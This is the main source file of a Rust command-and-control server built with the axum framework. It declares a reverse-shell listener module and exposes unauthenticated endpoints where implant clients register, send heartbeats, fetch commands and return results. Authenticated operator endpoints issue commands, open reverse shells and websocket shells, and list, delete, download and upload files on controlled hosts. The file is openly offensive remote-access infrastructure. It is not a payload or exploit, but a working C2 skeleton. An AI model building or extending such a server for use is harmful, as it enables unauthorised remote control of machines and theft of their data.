pub mod audit;
pub mod auth;
pub mod error;
pub mod handlers;
pub mod managers;
pub mod reverse_shell_listener; // Declare the new module
pub mod state;

use crate::{
    auth::{auth_middleware, login_get, login_post},
    handlers::{api, file, web},
    state::AppState,
};
use axum::{
    routing::{delete, get, post, put},
    serve, Router,
};
use common::config::ConfigManager;
use std::time::Duration;
use tokio::net::TcpListener;
use tower_cookies::CookieManagerLayer;
use tower_http::cors::CorsLayer;
use tower_http::services::ServeDir;

// Spawn a background task to periodically clean up expired sessions (but keep offline clients)
async fn cleanup_task(state: AppState) {
    let mut interval = tokio::time::interval(Duration::from_secs(60));
    loop {
        interval.tick().await;
        let timeout_seconds = state.config.client_timeout as i64;
        // Note: We don't cleanup offline clients to keep them in the list
        // state
        //     .client_manager
        //     .cleanup_offline_clients(timeout_seconds)
        //     .await;
        state
            .shell_manager
            .cleanup_expired_sessions(timeout_seconds)
            .await;
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Load configuration
    let config_path = "server_config.toml";
    println!("Attempting to load server config from: {config_path}");
    let config = ConfigManager::load_server_config(config_path)
        .map_err(|e| format!("Failed to load server config: {e}"))?;

    // Initialize tracing
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env().unwrap_or_else(|_| "info".into()),
        )
        .init();

    // Create application state
    let state = AppState::new(config.clone());

    // Spawn background cleanup task
    tokio::spawn(cleanup_task(state.clone()));

    // Routes that require authentication
    let protected_routes = Router::new()
        .route("/", get(web::index))
        .route("/client/{id}", get(web::client_detail))
        .route_layer(axum::middleware::from_fn_with_state(
            state.clone(),
            auth_middleware,
        ));

    // API routes for the C2 channel (no auth middleware)
    let c2_api_routes = Router::new()
        .route("/api/register", post(api::register_client))
        .route("/api/heartbeat", post(api::handle_heartbeat))
        .route("/api/commands/{client_id}", get(api::get_commands))
        .route("/api/command_result", post(api::handle_command_result))
        .route(
            "/api/file_operation_response/{client_id}",
            post(api::handle_file_operation_response),
        );

    // API routes for the web UI (these are protected by the auth middleware)
    let web_api_routes = Router::new()
        .route("/api/clients", get(api::api_clients))
        .route("/api/clients/display", get(api::api_clients_display))
        .route("/api/clients/{client_id}", delete(api::delete_client))
        .route("/api/logs", get(api::get_logs))
        .route("/api/logs/clear", post(api::clear_logs))
        .route("/api/notes", get(api::get_notes))
        .route("/api/notes", post(api::create_note))
        .route("/api/notes/{note_id}", put(api::update_note))
        .route("/api/notes/{note_id}", delete(api::delete_note))
        .route("/api/clients/{client_id}/commands", post(api::send_command))
        .route(
            "/api/clients/{client_id}/results",
            get(api::api_command_results),
        )
        .route(
            "/api/clients/{client_id}/reverse_shell",
            post(api::initiate_reverse_shell),
        )
        .route("/api/reverse_shells", get(api::list_reverse_shells))
        .route(
            "/api/reverse_shells/{connection_id}/close",
            post(api::close_reverse_shell),
        )
        .route(
            "/ws/shell/{connection_id}",
            get(api::handle_reverse_shell_websocket),
        )
        .route("/api/files/list", post(file::list_directory_handler))
        .route("/api/files/delete", post(file::delete_path_handler))
        .route(
            "/api/files/download/{*path}",
            get(file::download_file_handler),
        )
        .route("/api/files/upload/{*path}", post(file::upload_file_handler))
        .route_layer(axum::middleware::from_fn_with_state(
            state.clone(),
            auth_middleware,
        ));

    // Main application router
    let app = Router::new()
        .route("/login", get(login_get).post(login_post))
        .merge(protected_routes)
        .merge(c2_api_routes)
        .merge(web_api_routes)
        .nest_service("/static", ServeDir::new(&config.web.static_dir))
        .layer(CorsLayer::permissive())
        .layer(CookieManagerLayer::new())
        .with_state(state);

    let addr = format!("{}:{}", config.host, config.port);
    println!("C2 Server starting on http://{addr}");

    let listener = TcpListener::bind(&addr).await?;

    serve(listener, app).await?;

    Ok(())
}
